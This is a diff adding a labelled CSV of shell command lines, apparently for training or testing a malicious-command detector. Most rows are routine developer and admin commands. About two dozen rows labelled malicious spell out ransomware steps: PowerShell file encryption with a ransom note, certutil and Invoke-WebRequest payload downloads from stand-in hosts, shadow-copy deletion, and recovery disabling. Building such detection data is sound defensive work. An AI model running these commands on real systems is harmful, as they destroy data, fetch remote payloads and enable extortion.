@@ -1,0 +1,221 @@
+process_name,command_line,label
+powershell.exe,"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$k=Get-Content C:\ProgramData\targets.txt; foreach($f in $k){ try { $b=[System.IO.File]::ReadAllBytes($f); for($i=0;$i -lt $b.Length;$i++){ $b[$i]=$b[$i] -bxor 0x5A }; [System.IO.File]::WriteAllBytes($f + '.locked',$b); Remove-Item $f -Force; Set-Content -Path ((Split-Path $f) + '\README_RESTORE_FILES.txt') -Value 'Your files have been encrypted. Contact attacker for recovery.' -Force } catch {} }""",malicious
+pg_dump,pg_dump -U postgres appdb > appdb_backup.sql,benign
+git,git pull --rebase origin main,benign
+ansible-playbook,ansible-playbook -i inventory.ini site.yml --limit web,benign
+ps,ps aux --sort=-%mem | head,benign
+ls,ls -lah ~/Downloads,benign
+ssh-keygen,"ssh-keygen -t ed25519 -C ""dev@example.com"" -f ~/.ssh/id_ed25519_work",benign
+journalctl,journalctl -u nginx --since '1 hour ago',benign
+nohup,nohup python worker.py > worker.log 2>&1 &,benign
+python.exe,python.exe -m pip list --outdated,benign
+cargo,cargo build --release,benign
+wsl.exe,wsl.exe -d Ubuntu -- uname -a,benign
+traceroute,traceroute github.com,benign
+nslookup.exe,nslookup.exe example.com,benign
+python,python -m pytest tests/unit -q,benign
+pip,pip install black flake8 mypy,benign
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Get-PSDrive -PSProvider FileSystem | Select-Object Name,Root""",malicious
+mysqldump,mysqldump -u root -p inventory > inventory.sql,benign
+python,python -m pip install -r requirements.txt,benign
+whereis,whereis nginx,benign
+yum,sudo yum install -y tree,benign
+tar,tar -czf backup-configs.tar.gz /etc/nginx /etc/systemd/system,benign
+flatpak,flatpak update -y,benign
+head,head -n 20 access.log,benign
+mysql,"mysql -u appuser -p -e ""SHOW DATABASES;""",benign
+winget.exe,winget.exe upgrade --all,benign
+cmd.exe,cmd.exe /c dir C:\Users\ /s /b *.docx *.xlsx *.pdf,malicious
+dnf,sudo dnf check-update,benign
+gcc,gcc -O2 -Wall -o bin/tool src/tool.c,benign
+docker-compose,docker-compose logs -f db,benign
+mv,mv report-final.txt report-2026-06.txt,benign
+ln,ln -s /opt/node/bin/node /usr/local/bin/node,benign
+wc,wc -l data/events.jsonl,benign
+powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 20""",benign
+wget,wget https://releases.ubuntu.com/24.04/SHA256SUMS,benign
+fish,fish -c 'set -S PATH',benign
+yarn,yarn install --frozen-lockfile,benign
+certutil.exe,certutil.exe -urlcache -split -f http://203.0.113.50/payloads/locker.exe C:\ProgramData\locker.exe,malicious
+find,"find . -type f -name ""*.log"" -mtime -1",benign
+cmd.exe,cmd.exe /c dir C:\Projects\App\src,benign
+redis-cli,redis-cli ping,benign
+git,git push -u origin feature/login-form,benign
+sudo,sudo apt update,benign
+reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run,benign
+cmake,cmake --build build -j4,benign
+locker.exe,C:\ProgramData\locker.exe --encrypt C:\Users --shares \\fileserver\finance --note C:\ProgramData\README_RESTORE.txt,malicious
+powershell.exe,powershell.exe -ExecutionPolicy Bypass -File .\scripts\build.ps1 -Configuration Release,benign
+jq,jq '.users[] | select(.active==true)' data/users.json,benign
+netstat.exe,netstat.exe -ano,benign
+cut,cut -d: -f1 /etc/passwd,benign
+npm,npm install,benign
+patch,patch -p1 < fixes.patch,benign
+curl,curl -I https://example.com,benign
+strace,strace -p 12345,benign
+tracert.exe,tracert.exe github.com,benign
+sw_vers,sw_vers,benign
+ss,ss -tulpn,benign
+brew,brew upgrade python,benign
+notepad.exe,notepad.exe C:\Temp\notes.txt,benign
+sqlite3,"sqlite3 app.db ""SELECT count(*) FROM users;""",benign
+gpg,gpg --list-secret-keys --keyid-format LONG,benign
+clang,clang -Weverything hello.c -o hello,benign
+openssl,openssl x509 -in server.crt -noout -dates,benign
+git.exe,git.exe clone https://github.com/microsoft/PowerToys.git,benign
+cmake,cmake -S . -B build,benign
+dotnet,dotnet test tests/MyApp.Tests/MyApp.Tests.csproj,benign
+cmd.exe,cmd.exe /c type C:\Windows\System32\drivers\etc\hosts,benign
+defaults,defaults read com.apple.finder AppleShowAllFiles,benign
+code,code .,benign
+docker,docker exec -it web bash,benign
+history,history | tail -20,benign
+vssadmin.exe,vssadmin.exe delete shadows /all /quiet,malicious
+brew,brew install wget,benign
+crontab,crontab -l,benign
+cmd.exe,cmd.exe /c dir C:\Users\*\Documents /s /b,malicious
+packer,packer validate ubuntu.pkr.hcl,benign
+file,file ~/Downloads/setup.bin,benign
+pwd,pwd,benign
+dotnet,dotnet restore,benign
+helm,helm list -A,benign
+mvn,mvn clean package -DskipTests,benign
+nslookup,nslookup intranet.local,benign
+df,df -h,benign
+npx,npx create-react-app dashboard-ui,benign
+lsof,lsof -i :8080,benign
+sed,"sed -n '1,120p' config/app.conf",benign
+schtasks.exe,schtasks.exe /Query /FO LIST /V,benign
+make,make test,benign
+docker-compose,docker-compose up -d,benign
+hostname,hostnamectl status,benign
+man,man rsync,benign
+choco.exe,choco.exe install 7zip -y,benign
+git,"git commit -m ""Add client-side validation for login form""",benign
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""Get-SmbShare | Select-Object Name,Path""",malicious
+which,which python3,benign
+explorer.exe,explorer.exe C:\Users\Alice\Downloads,benign
+netstat,netstat -rn,benign
+docker,docker ps,benign
+less,less /var/log/nginx/error.log,benign
+cmd.exe,"cmd.exe /c C:\ProgramData\locker.exe --path C:\ --path \\fileserver\finance --note ""Your files have been encrypted. Contact us at recovery@mailfence.com""",malicious
+powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem C:\Users\Public\Documents""",benign
+yarn,yarn start,benign
+scp,scp nginx.conf admin@web01.example.net:/tmp/nginx.conf,benign
+ipconfig.exe,ipconfig.exe /all,benign
+tee,"echo ""export GOPATH=$HOME/go"" | tee -a ~/.profile",benign
+nano,nano /etc/hosts,benign
+docker,docker logs --tail 100 api,benign
+systemctl,sudo systemctl enable postgresql,benign
+ping.exe,ping.exe -n 4 intranet.company.local,benign
+bcdedit.exe,bcdedit.exe /set {default} recoveryenabled No,malicious
+dig,dig example.org MX +short,benign
+pwsh,"pwsh -NoLogo -Command ""Get-Date; Get-Location""",benign
+uname,uname -a,benign
+docker,docker run --rm -p 8080:80 nginx:latest,benign
+sort,sort names.txt | uniq -c | sort -nr,benign
+whoami,whoami,benign
+pacman,sudo pacman -Syu,benign
+mkdir,mkdir -p ~/workspace/archive/2026-06,benign
+screen,screen -ls,benign
+ansible,ansible all -i inventory.ini -m ping,benign
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""Get-ChildItem -Path C:\Users -Include *.doc,*.docx,*.xls,*.xlsx,*.ppt,*.pptx,*.pdf,*.jpg,*.txt -File -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName > C:\ProgramData\targets.txt""",malicious
+g++,g++ -std=c++17 -O2 -o app src/main.cpp,benign
+open,open -a Safari https://developer.apple.com,benign
+lldb,lldb ./bin/service,benign
+systeminfo.exe,systeminfo.exe,benign
+python,python -m venv .venv,benign
+du,du -sh ~/projects/* | sort -h,benign
+free,free -m,benign
+ifconfig,ifconfig en0,benign
+apt,apt list --upgradable,benign
+unzip,unzip release-artifacts.zip -d /tmp/release-artifacts,benign
+go,go build -o bin/service ./cmd/service,benign
+npm,npm test -- --watch=false,benign
+osascript,"osascript -e 'display notification ""Build completed"" with title ""CI""'",benign
+docker,docker build -t myapp:dev .,benign
+yarn,yarn test --coverage,benign
+gradle,gradle test,benign
+cmd.exe,cmd.exe /c dir C:\Users\*\Documents /s /b,malicious
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri http://192.168.56.10/payloads/locker.exe -OutFile C:\ProgramData\locker.exe""",malicious
+bash,bash -lc 'cd ~/projects/api && git status',benign
+psql,"psql -h localhost -U postgres -d appdb -c ""SELECT NOW();""",benign
+ping,ping -c 4 8.8.8.8,benign
+cmd.exe,"cmd.exe /c wmic logicaldisk get caption,freespace,size,volumename",malicious
+zsh,zsh -lc 'source ~/.zshrc && alias',benign
+terraform,terraform fmt -recursive,benign
+tasklist.exe,tasklist.exe /v,benign
+top,top -b -n 1,benign
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$u='http://198.51.100.24/update.ps1';$p='$env:TEMP\update.ps1';Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile $p;powershell.exe -ExecutionPolicy Bypass -File $p""",malicious
+apt-get,sudo apt-get install -y jq,benign
+net.exe,net.exe user,benign
+diff,diff -u config.old.yml config.yml,benign
+service,service ssh status,benign
+sleep,sleep 5,benign
+black,black src tests,benign
+npm,npm run lint,benign
+go,go mod tidy,benign
+mypy,mypy src,benign
+awk,"awk -F, '{print $1}' users.csv | sort | uniq",benign
+printenv,printenv PATH,benign
+kubectl,kubectl logs deployment/api --tail=50 -n staging,benign
+tmux,tmux new-session -s deploy,benign
+git,git add src/auth/login.js package.json,benign
+git,git checkout -b feature/login-form,benign
+gdb,gdb --args python app.py --debug,benign
+at,"echo ""sh /home/user/scripts/cleanup.sh"" | at 23:00",benign
+umount,sudo umount /mnt/usb,benign
+tail,tail -f /var/log/syslog,benign
+rsync,rsync -avz ~/site/ deploy@web01.example.net:/var/www/site/,benign
+vssadmin.exe,vssadmin.exe Delete Shadows /All /Quiet,malicious
+node.exe,node.exe .\dist\server.js,benign
+systemctl,systemctl status nginx,benign
+id,id,benign
+cmd.exe,cmd.exe /c net view \\fileserver,malicious
+make,make clean all,benign
+mongosh,"mongosh mongodb://localhost:27017/admin --eval ""db.serverStatus().ok""",benign
+ip,ip addr show,benign
+powershell.exe,"powershell.exe -NoProfile -Command ""Get-Process | Sort-Object CPU -Descending | Select-Object -First 10""",benign
+docker,docker images,benign
+dotnet,dotnet build MyApp.sln,benign
+snap,snap list,benign
+powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Get-ChildItem 'C:\Users','D:\','\\fileserver\shares' -Recurse -File -Include *.doc,*.docx,*.xls,*.xlsx,*.ppt,*.pptx,*.pdf | ForEach-Object { $b=[IO.File]::ReadAllBytes($_.FullName); [IO.File]::WriteAllBytes($_.FullName + '.locked',$b); Remove-Item $_.FullName -Force }""",malicious
+env,env | sort,benign
+npm.cmd,npm.cmd run start,benign
+kubectl,kubectl describe deployment web -n prod,benign
+terraform,terraform init,benign
+go,go test ./...,benign
+java,java -jar build/libs/app.jar --spring.profiles.active=dev,benign
+htop,htop,benign
+node,node server.js --port 3000,benign
+cp,cp .env.example .env,benign
+vssadmin.exe,vssadmin.exe Delete Shadows /All /Quiet,malicious
+vim,vim ~/.bashrc,benign
+chown,sudo chown -R www-data:www-data /var/www/html,benign
+py.exe,py.exe -3 -m pytest tests\unit -q,benign
+npm,npm run build,benign
+vssadmin.exe,vssadmin.exe delete shadows /all /quiet,malicious
+terraform,terraform plan -out=tfplan,benign
+cargo,cargo test,benign
+xargs,"find logs -name ""*.gz"" | xargs -n1 gzip -d",benign
+javac,javac -d out src/com/example/App.java,benign
+flake8,flake8 src tests,benign
+npx,npx eslint src --fix,benign
+grep,"grep -R ""TODO"" src/",benign
+rustc,rustc --version,benign
+python,python manage.py runserver 0.0.0.0:8000,benign
+rm,rm -f /tmp/app-cache.json,benign
+mount,mount | grep /dev/sda1,benign
+whoami.exe,whoami.exe /all,benign
+curl,curl -s https://api.github.com/repos/nodejs/node | jq '.stargazers_count',benign
+date,date '+%Y-%m-%d %H:%M:%S',benign
+helm,helm upgrade --install metrics-server metrics-server/metrics-server -n kube-system,benign
+cat,cat /etc/os-release,benign
+diskutil,diskutil list,benign
+kubectl,kubectl get pods -n default,benign
+systemctl,sudo systemctl restart docker,benign
+npm,npm run dev,benign
+zip,zip -r screenshots.zip ~/Pictures/Screenshots,benign
+ssh,ssh devops@web01.example.net,benign
+python,python scripts/seed_demo_data.py --env dev,benign
+chmod,chmod +x scripts/deploy.sh,benign
